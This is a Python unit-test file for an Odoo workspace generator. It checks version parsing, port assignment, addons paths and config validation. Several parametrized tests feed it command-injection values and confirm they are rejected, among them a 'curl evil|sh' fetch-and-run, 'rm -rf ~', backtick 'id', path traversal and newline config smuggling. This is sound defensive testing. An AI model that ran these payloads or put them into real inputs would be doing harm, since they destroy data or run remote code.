"""Unit tests for the domain model — pure, no filesystem or shell access."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from odoo_dwg.models import (
    DB_ROLE_RE,
    DEFAULT_DB_ROLE,
    MIGRATION_CHAIN,
    InstanceConfig,
    WorkspaceConfig,
    odoo_major,
    python_minimum_for,
)


def test_odoo_major_parses_version():
    assert odoo_major("18.0") == 18
    assert odoo_major("12.0") == 12
    with pytest.raises(ValueError):
        odoo_major("not-a-version")


def test_python_minimum_matches_official_floors():
    # Verbatim from the official "Source install" pages.
    assert python_minimum_for("12.0") == "3.5"
    assert python_minimum_for("13.0") == "3.6"
    assert python_minimum_for("14.0") == "3.7"
    assert python_minimum_for("17.0") == "3.10"
    assert python_minimum_for("18.0") == "3.10"


def test_migration_chain_is_sequential_no_skips():
    majors = [odoo_major(v) for v in MIGRATION_CHAIN]
    assert majors == list(range(12, 20))


def test_instance_names_and_paths():
    inst = InstanceConfig("acme", "18.0")
    assert inst.name == "odoo18acme"
    assert inst.venv_name == "odoo18"
    assert inst.conf_name == "odoo18.conf"
    assert inst.python_minimum == "3.10"


def test_workspace_port_offsets_are_deterministic():
    cfg = WorkspaceConfig(name="acme", versions=["18.0", "17.0", "19.0"])
    cfg.normalize_defaults()
    # Sorted by major → 17=base, 18=+10, 19=+20.
    assert cfg.http_port_for("17.0") == 8069
    assert cfg.http_port_for("18.0") == 8079
    assert cfg.http_port_for("19.0") == 8089


def test_normalize_defaults_fills_the_db_user():
    cfg = WorkspaceConfig(name="acme")
    cfg.normalize_defaults()
    # The shared development role, the one `provision apply` creates by default.
    assert cfg.db_user == DEFAULT_DB_ROLE == "odoo"


def test_normalize_defaults_keeps_an_explicit_db_user():
    cfg = WorkspaceConfig(name="acme", db_user="acme")
    cfg.normalize_defaults()
    assert cfg.db_user == "acme"


def test_validate_rejects_an_unsafe_db_user():
    cfg = WorkspaceConfig(name="acme", versions=["18.0"], db_user="odoo; DROP ROLE x")
    with pytest.raises(ValueError, match="db_user"):
        cfg.validate()
    # A newline would break out of the heredoc that writes odoo.conf.
    cfg.db_user = "odoo\nEOF"
    with pytest.raises(ValueError, match="db_user"):
        cfg.validate()


def test_db_role_pattern():
    for role in ("odoo", "_dev", "acme_2", "a" * 63):
        assert DB_ROLE_RE.fullmatch(role)
    for role in ("", "Odoo", "2acme", "a-b", "odoo'", "a" * 64):
        assert not DB_ROLE_RE.fullmatch(role)


def test_validate_rejects_bad_name_and_version():
    with pytest.raises(ValueError):
        cfg = WorkspaceConfig(name="Acme!", versions=["18.0"])
        cfg.validate()
    with pytest.raises(ValueError):
        cfg = WorkspaceConfig(name="acme", versions=["nope"])
        cfg.validate()


def test_json_round_trip_ignores_unknown_keys():
    cfg = WorkspaceConfig(name="acme", versions=["18.0"])
    cfg.normalize_defaults()
    data = json.loads(cfg.to_json())
    data["some_future_key"] = "ignored"
    restored = WorkspaceConfig.from_dict(data)
    assert restored.name == "acme"
    assert restored.versions == ["18.0"]


def test_addons_path_ordering_with_oca():
    cfg = WorkspaceConfig(name="acme", versions=["18.0"], oca_repos=["web", "server-tools"])
    entries = [Path(p) for p in cfg.addons_path("18.0").split(",")]
    # custom → each OCA repo (via in-workspace symlink) → shared odoo/addons.
    assert entries[0] == cfg.addons_custom_dir
    assert entries[1] == cfg.oca_symlink_dir("web", "18.0")
    assert entries[2] == cfg.oca_symlink_dir("server-tools", "18.0")
    assert entries[-1] == cfg.odoo_clone_dir("18.0") / "addons"


def test_addons_path_without_oca_is_custom_then_odoo():
    cfg = WorkspaceConfig(name="acme", versions=["18.0"])
    entries = [Path(p) for p in cfg.addons_path("18.0").split(",")]
    assert entries == [cfg.addons_custom_dir, cfg.odoo_clone_dir("18.0") / "addons"]


def test_shared_cache_paths():
    cfg = WorkspaceConfig(name="acme", versions=["18.0"], oca_repos=["web"])
    assert cfg.odoo_clone_dir("18.0").name == "odoo-18.0"
    assert cfg.odoo_clone_dir("18.0").parent == cfg.repos_dir
    assert cfg.oca_clone_dir("web", "18.0").name == "web-18.0"
    assert cfg.oca_clone_dir("web", "18.0").parent == cfg.repos_dir / "oca"
    # The shared cache lives beside workspaces, not inside one.
    assert cfg.repos_dir != cfg.root


def test_derived_tree_paths():
    cfg = WorkspaceConfig(name="acme", versions=["18.0"])
    assert cfg.venv_dir("18.0") == cfg.root / ".venv" / "odoo18"
    assert cfg.config_file("18.0") == cfg.root / "config" / "odoo18.conf"
    assert cfg.code_workspace_file == cfg.root / "acme.code-workspace"
    assert cfg.readme_file == cfg.root / "README.md"


def test_save_and_load_round_trip(tmp_path):
    cfg = WorkspaceConfig(name="acme", versions=["18.0", "17.0"], oca_repos=["web"])
    cfg.normalize_defaults()
    path = tmp_path / "workspace-acme.json"
    cfg.save(path)
    restored = WorkspaceConfig.load(path)
    assert restored.name == "acme"
    assert restored.versions == ["17.0", "18.0"]
    assert restored.oca_repos == ["web"]
    assert restored.db_user == "odoo"



# --- validation of everything that reaches paths, scripts and odoo.conf -------

import pytest as _pytest  # noqa: E402

from odoo_dwg.models import MigrationEnv as _MigrationEnv  # noqa: E402

INJECTIONS = ["18.0$(touch /tmp/p)", "18.0\nadmin_passwd = x", "18.0`id`", "18.0; rm -rf ~"]


@_pytest.mark.parametrize("version", INJECTIONS + ["18", "20.0", "11.0", "", 18.0, None])
def test_workspace_rejects_anything_but_a_supported_version(version):
    cfg = WorkspaceConfig(name="acme", versions=[version])
    cfg.normalize_defaults()  # never raises on a bad value
    with _pytest.raises(ValueError, match="invalid Odoo version"):
        cfg.validate()


@_pytest.mark.parametrize("source,target", [("13.0$(curl evil|sh)", "15.0"),
                                            ("13", "15.0"), ("13.0", "15.0`id`")])
def test_migration_rejects_anything_but_chain_versions(source, target):
    with _pytest.raises(ValueError, match="invalid Odoo version"):
        _MigrationEnv(source=source, target=target).validate()


@_pytest.mark.parametrize("field,value,message", [
    ("oca_repos", ["../../etc"], "invalid OCA repository name"),
    ("oca_repos", ["web/../x"], "invalid OCA repository name"),
    ("oca_repos", ["web$(id)"], "invalid OCA repository name"),
    ("oca_repos", "web", "oca_repos must be a list"),
    ("db_host", "127.0.0.1\nadmin_passwd = x", "invalid db_host"),
    ("db_host", "$(id)", "invalid db_host"),
    ("db_port", "5432", "invalid db_port"),
    ("db_port", 70000, "invalid db_port"),
    ("http_port_base", True, "invalid http_port_base"),
    ("name", 7, "invalid workspace name"),
    ("db_user", ["odoo"], "invalid db_user"),
])
def test_workspace_rejects_unsafe_profile_values(field, value, message):
    cfg = WorkspaceConfig(name="acme", versions=["18.0"])
    cfg.normalize_defaults()
    setattr(cfg, field, value)
    with _pytest.raises(ValueError, match=message):
        cfg.validate()


def test_valid_profile_values_still_pass():
    cfg = WorkspaceConfig(name="acme", versions=["19.0", "12.0"], oca_repos=["web", "server-tools",
                          "l10n-spain"], db_host="db.internal.example", db_port=5433)
    cfg.normalize_defaults()
    cfg.validate()
    assert cfg.versions == ["12.0", "19.0"]
    for host in ("127.0.0.1", "::1", "localhost"):
        cfg.db_host = host
        cfg.validate()


def test_the_chain_is_every_supported_version():
    from odoo_dwg.models import MIGRATION_CHAIN, ODOO_SUPPORT
    assert MIGRATION_CHAIN == tuple(f"{major}.0" for major in sorted(ODOO_SUPPORT))
